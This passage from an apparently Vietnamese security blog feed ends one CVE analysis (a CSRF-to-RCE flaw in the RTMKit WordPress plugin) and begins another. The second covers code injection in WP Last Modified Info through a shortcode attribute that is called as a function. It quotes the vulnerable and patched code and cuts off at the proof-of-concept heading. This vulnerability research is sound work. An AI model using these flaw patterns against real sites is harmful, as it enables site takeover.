}&#xA;});&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Thực hiện RCE&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-03-cve-2025-30911/result.png&#34; title=&#34;Kết quả&#34; data-thumbnail=&#34;/posts/2025-12-03-cve-2025-30911/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Kết quả&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-03-cve-2025-30911/result.png&#39; alt=&#34;Result&#34; height=&#34;813&#34; width=&#34;1249&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng trong &lt;strong&gt;RTMKit &amp;lt;= 1.5.4&lt;/strong&gt; nằm ở &lt;code&gt;install_requirements()&lt;/code&gt;, khi hàm này xử lý trực tiếp giá trị &lt;code&gt;$_POST[&#39;plugin&#39;]&lt;/code&gt; để cài đặt và kích hoạt plugin mà thiếu kiểm soát đầy đủ. Phiên bản &lt;strong&gt;1.5.4&lt;/strong&gt; đã thêm kiểm tra quyền với &lt;code&gt;current_user_can(&#39;manage_options&#39;)&lt;/code&gt; nhưng vẫn thiếu bảo vệ &lt;strong&gt;CSRF&lt;/strong&gt;, cho phép attacker lợi dụng &lt;strong&gt;Administrator&lt;/strong&gt; đang đăng nhập để gửi request ngầm và cài plugin độc hại. Chỉ đến &lt;strong&gt;v1.5.5&lt;/strong&gt;, việc kết hợp thêm &lt;code&gt;wp_verify_nonce()&lt;/code&gt; mới vá kín lỗ hổng và chặn được nguy cơ &lt;strong&gt;RCE&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Luôn kiểm tra quyền và &lt;strong&gt;nonce&lt;/strong&gt; cho mọi AJAX endpoint.&lt;/li&gt;&#xA;&lt;li&gt;Không xử lý trực tiếp input người dùng với các hành động nhạy cảm như cài/kích hoạt plugin.&lt;/li&gt;&#xA;&lt;li&gt;Kiểm tra quyền thôi là chưa đủ, phải có chống &lt;strong&gt;CSRF&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/rometheme-for-elementor/vulnerability/wordpress-romethemekit-for-elementor-plugin-1-5-4-arbitrary-plugin-installation-activation-to-rce-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress RTMKit Plugin &amp;lt;= 1.5.4 is vulnerable to Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-52756 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-02-cve-2025-52756/</link>
      <pubDate>Tue, 02 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-02-cve-2025-52756/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-02-cve-2025-52756/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;Improper Control of Generation of Code (&amp;lsquo;Code Injection&amp;rsquo;)&lt;/strong&gt; trong plugin Sayan Datta &lt;strong&gt;WP Last Modified Info (wp-last-modified-info)&lt;/strong&gt; cho phép &lt;strong&gt;Remote Code Inclusion&lt;/strong&gt;. Vấn đề này ảnh hưởng đến &lt;strong&gt;WP Last Modified Info&lt;/strong&gt; từ &lt;strong&gt;n/a&lt;/strong&gt; đến &lt;strong&gt;&amp;lt;= 1.9.2&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-52756&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-52756&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.9.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.9.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.2)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/wp-last-modified-info/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WP Last Modified Info Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;WP Last Modified Info&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.9.4&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.9.5&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Trong phiên bản lỗi (v1.9.4):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function render( $atts ) {&#xA;    $post = get_post();&#xA;    if ( ! $post instanceof \WP_Post ) {&#xA;        return &amp;#39;&amp;#39;;&#xA;    }&#xA;&#xA;    if ( ! $this-&amp;gt;is_enabled( &amp;#39;enable_last_modified_cb&amp;#39; ) ) {&#xA;        return &amp;#39;&amp;#39;;&#xA;    }&#xA;&#xA;    $author_id = $this-&amp;gt;get_meta( $post-&amp;gt;ID, &amp;#39;_edit_last&amp;#39; );&#xA;    if ( $this-&amp;gt;is_equal( &amp;#39;show_author_cb&amp;#39;, &amp;#39;custom&amp;#39;, &amp;#39;default&amp;#39; ) ) {&#xA;        $author_id = $this-&amp;gt;get_data( &amp;#39;lmt_show_author_list&amp;#39; );&#xA;    }&#xA;    &#xA;    $default_format = get_option( &amp;#39;date_format&amp;#39; );&#xA;    $atts = shortcode_atts( [&#xA;        &amp;#39;id&amp;#39;           =&amp;gt; $post-&amp;gt;ID,&#xA;        &amp;#39;template&amp;#39;     =&amp;gt; $this-&amp;gt;get_data( &amp;#39;lmt_last_modified_info_template&amp;#39; ),&#xA;        &amp;#39;date_format&amp;#39;  =&amp;gt; $this-&amp;gt;get_data( &amp;#39;lmt_date_time_format&amp;#39;, $default_format ),&#xA;        &amp;#39;date_type&amp;#39;    =&amp;gt; $this-&amp;gt;get_data( &amp;#39;lmt_last_modified_format_post&amp;#39;, &amp;#39;default&amp;#39; ),&#xA;        &amp;#39;schema&amp;#39;       =&amp;gt; $this-&amp;gt;get_data( &amp;#39;lmt_enable_jsonld_markup_cb&amp;#39;, &amp;#39;disable&amp;#39; ),&#xA;        &amp;#39;author_id&amp;#39;    =&amp;gt; (int) $author_id,&#xA;        &amp;#39;hide_archive&amp;#39; =&amp;gt; &amp;#39;&amp;#39;,&#xA;        &amp;#39;filter_ids&amp;#39;   =&amp;gt; &amp;#39;&amp;#39;,&#xA;        &amp;#39;gap&amp;#39;          =&amp;gt; (int) $this-&amp;gt;get_data( &amp;#39;lmt_gap_on_post&amp;#39;, 0 ),&#xA;    ], $atts, &amp;#39;lmt-post-modified-info&amp;#39; );&#xA;&#xA;    $_post = get_post( absint( $atts[&amp;#39;id&amp;#39;] ) );&#xA;    if ( ! $_post ) {&#xA;        return &amp;#39;&amp;#39;;&#xA;    }&#xA;&#xA;    if ( $atts[&amp;#39;hide_archive&amp;#39;] !== &amp;#39;&amp;#39; ) {&#xA;        foreach ( array_map( &amp;#39;trim&amp;#39;, explode( &amp;#39;,&amp;#39;, $atts[&amp;#39;hide_archive&amp;#39;] ) ) as $callback ) {&#xA;            if ( is_callable( $callback ) &amp;amp;&amp;amp; $callback() ) {&#xA;                return &amp;#39;&amp;#39;;&#xA;            }&#xA;        }&#xA;    }&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;render()&lt;/code&gt; của shortcode cho phép nhận thuộc tính &lt;code&gt;$atts[&#39;hide_archive&#39;]&lt;/code&gt; từ người dùng. Giá trị này là một chuỗi chứa &lt;strong&gt;danh sách các tên hàm&lt;/strong&gt;, được ngăn cách bởi dấu phẩy (&lt;code&gt;,&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;p&gt;Ví dụ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$atts[&amp;#39;hide_archive&amp;#39;] = &amp;#34;a,b,c&amp;#34;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi đó:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;explode(&amp;#39;,&amp;#39;, $atts[&amp;#39;hide_archive&amp;#39;]) &#xA;→ [&amp;#39;a&amp;#39;, &amp;#39;b&amp;#39;, &amp;#39;c&amp;#39;]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sau khi tách chuỗi bằng &lt;code&gt;explode()&lt;/code&gt;, đoạn code dùng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;array_map(&amp;#39;trim&amp;#39;, ...)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;để &lt;strong&gt;xoá khoảng trắng thừa&lt;/strong&gt; ở đầu/người mỗi phần tử, đảm bảo tên hàm “sạch” trước khi xử lý. Kết quả vẫn là một mảng các chuỗi, nhưng đã được chuẩn hoá:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;[&amp;#34; a &amp;#34;, &amp;#34; b &amp;#34;, &amp;#34; c &amp;#34;] → [&amp;#34;a&amp;#34;, &amp;#34;b&amp;#34;, &amp;#34;c&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tiếp theo, vòng lặp &lt;code&gt;foreach&lt;/code&gt; duyệt từng phần tử và gán vào biến &lt;code&gt;$callback&lt;/code&gt;. Tại đây, &lt;code&gt;$callback&lt;/code&gt; chính là &lt;strong&gt;tên một hàm dưới dạng chuỗi&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;foreach ( ... as $callback ) &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Với mỗi &lt;code&gt;$callback&lt;/code&gt;, code kiểm tra:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;is_callable( $callback )&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Điều này có nghĩa là:&#xA;👉 Tên hàm này &lt;strong&gt;có tồn tại và có thể gọi được hay không&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Nếu đúng, đoạn code tiếp tục gọi trực tiếp hàm đó:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$callback()&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Không có tham số nào được truyền vào. Nếu hàm được gọi trả về &lt;code&gt;true&lt;/code&gt; thì plugin sẽ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;return &amp;#39;&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;và &lt;strong&gt;không hiển thị bất kỳ nội dung nào của shortcode&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bản vá (v1.9.5):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-02-cve-2025-52756/diff.png&#34; title=&#34;Sự thay đổi của bản vá&#34; data-thumbnail=&#34;/posts/2025-12-02-cve-2025-52756/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Sự thay đổi của bản vá&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-02-cve-2025-52756/diff.png&#39; alt=&#34;Diff&#34; height=&#34;149&#34; width=&#34;1833&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Sự thay đổi của bản vá&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Bản vá đã dùng whitelist cho các function =&amp;gt; Tránh gọi hàm tuỳ ý.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Shortcode extends PostView {&#xA;    ...&#xA;    if ( in_array( $archive, $this-&amp;gt;functions, true ) &amp;amp;&amp;amp; is_callable( $archive ) &amp;amp;&amp;amp; $archive() ) {&#xA;        return $content;&#xA;    }&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;class PostView {&#xA;    protected $functions = [&#xA;        &amp;#39;is_archive&amp;#39;,&#xA;        &amp;#39;is_tax&amp;#39;,&#xA;        &amp;#39;is_home&amp;#39;,&#xA;        &amp;#39;is_front_page&amp;#39;,&#xA;        &amp;#39;is_search&amp;#39;,&#xA;        &amp;#39;is_404&amp;#39;,&#xA;        &amp;#39;is_author&amp;#39;,&#xA;        &amp;#39;is_category&amp;#39;,&#xA;        &amp;#39;is_tag&amp;#39;,&#xA;    ];&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Vì class &lt;code&gt;ShortCode&lt;/code&gt; kế thừa &lt;code&gt;PostView&lt;/code&gt; nên có thể sử dụng được &lt;code&gt;$functions&lt;/code&gt; của lớp cha.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký một shortcode bằng dòng lệnh:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_shortcode( &amp;#39;lmt-post-modified-info&amp;#39;, [ $this, &amp;#39;render&amp;#39; ] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Điều này có nghĩa là:&#xA;khi WordPress gặp shortcode có tag &lt;strong&gt;&lt;code&gt;lmt-post-modified-info&lt;/code&gt;&lt;/strong&gt; trong nội dung bài viết (hoặc khi bài viết được hiển thị và có chứa shortcode này), WordPress sẽ &lt;strong&gt;gọi phương thức &lt;code&gt;render()&lt;/code&gt; của class hiện tại&lt;/strong&gt; để xử lý và trả về nội dung tương ứng.&lt;/p&gt;&#xA;&lt;p&gt;Để các logic của render được gọi ta cần phải vượt qua:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! $this-&amp;gt;is_enabled( &amp;#39;enable_last_modified_cb&amp;#39; ) ) {&#xA;    return &amp;#39;&amp;#39;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tức cần phải bật option:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-02-cve-2025-52756/option.png&#34; title=&#34;Show Info on Frontend&#34; data-thumbnail=&#34;/posts/2025-12-02-cve-2025-52756/option.png&#34; data-sub-html=&#34;&lt;h2&gt;Show Info on Frontend&lt;/h2&gt;&lt;p&gt;Show Info on Frontend&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-02-cve-2025-52756/option.png&#39; alt=&#34;Show Info on Frontend&#34; height=&#34;390&#34; width=&#34;1034&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Show Info on Frontend&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Contributor adds shortcode [lmt-post-modified-info hide_archive=&amp;#39;...&amp;#39;] in post&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;WordPress loads the post content&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;Shortcode::render($atts) is executed&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;$atts[&amp;#39;hide_archive&amp;#39;] is parsed and trimmed into list of callbacks&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;For each $callback in list&amp;#34;]&#xA;E --&amp;gt; F{&amp;#34;is_callable($callback)?&amp;#34;}&#xA;F --&amp;gt;|Yes| G[&amp;#34;Invoke $callback()&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept 